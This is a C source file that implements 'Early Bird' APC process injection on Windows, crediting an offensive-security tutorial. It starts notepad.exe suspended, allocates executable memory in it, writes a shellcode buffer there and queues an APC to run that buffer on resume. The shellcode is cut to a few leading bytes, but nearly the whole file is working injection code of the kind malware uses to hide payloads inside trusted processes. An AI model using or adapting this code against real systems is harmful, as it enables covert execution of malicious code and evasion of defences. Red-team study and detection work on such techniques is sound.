// Earlybird injection: suspended process & queueuserapc
// Thanks to: https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection
#include <Windows.h>
#include <wchar.h>
#include <stdio.h> 

unsigned char shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	//0x41, 0x50, 0x52,...
};

unsigned int len = sizeof(shellcode);

int main(int argc, char* argv[]) {
	STARTUPINFOA sInfo;
	PROCESS_INFORMATION pInfo;
	//ZeroMemory(&sInfo, sizeof(sInfo));
	//ZeroMemory(&pInfo, sizeof(pInfo));
	//sInfo.cb = sizeof(sInfo);
	HANDLE process_handle;
	HANDLE thread_handle;
	VOID *remote_buffer;

	printf("%s\n", "Spawning notepad.exe in suspended mode...");
	// Creating process in suspended mode
	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo);
	process_handle = pInfo.hProcess;
	printf("%-15s : %lu\n", "PID", pInfo.dwProcessId);

	// allocate memory buffer for remote process
	remote_buffer = VirtualAllocEx(process_handle, NULL, len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (remote_buffer == NULL) return 0;
	printf("%-15s : 0x%-016p\n", "alloc_mem addr", (void*)remote_buffer);

	// APC routine
	PTHREAD_START_ROUTINE apc_routine = (PTHREAD_START_ROUTINE)remote_buffer;

	// write code in another process memory
	if (!WriteProcessMemory(process_handle, remote_buffer, shellcode, len, NULL)) return 0;

	// select info form suspended process
	thread_handle = pInfo.hThread;
	printf("%-15s : %lu\n", "Thread ID", pInfo.dwThreadId);
	printf("Press Enter to continue...");
	getchar();
	
	QueueUserAPC((PAPCFUNC)apc_routine, thread_handle, NULL);

	// resume...
	ResumeThread(pInfo.hThread);
}